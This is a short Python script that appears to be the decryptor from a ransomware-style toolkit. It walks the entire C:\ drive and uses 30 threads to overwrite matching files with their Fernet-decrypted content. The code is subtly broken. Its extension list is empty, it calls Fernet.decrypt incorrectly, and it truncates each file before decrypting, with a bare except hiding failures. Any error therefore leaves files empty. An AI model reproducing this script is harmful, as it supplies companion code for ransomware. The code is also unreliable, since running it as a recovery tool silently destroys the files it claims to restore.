import os
import threading
import queue
from cryptography.fernet import Fernet

def decrypt(key):
    while True:
        file = q.get()
        try:
            with open(file, 'rb') as f:
                data = f.read()
            with open(file, 'wb') as f:
                f.write(Fernet.decrypt(key, data))
        except:
            pass
        q.task_done()


encrypted_ext = ()
file_paths = []
for root, dirs, files in os.walk('C:\\'):
    for file in files:
        file_path, file_ext = os.path.splitext(root + '\\' + file)
        if file_ext in encrypted_ext:
            file_paths.append(root+'\\'+file)

key = input('Please Enter Decryption key:')

q = queue.Queue()
for file in file_paths:
    q.put(file)
for i in range(30):
    thread = threading.Thread(target=decrypt, args=(key,), daemon=True)
    thread.start()

q.join()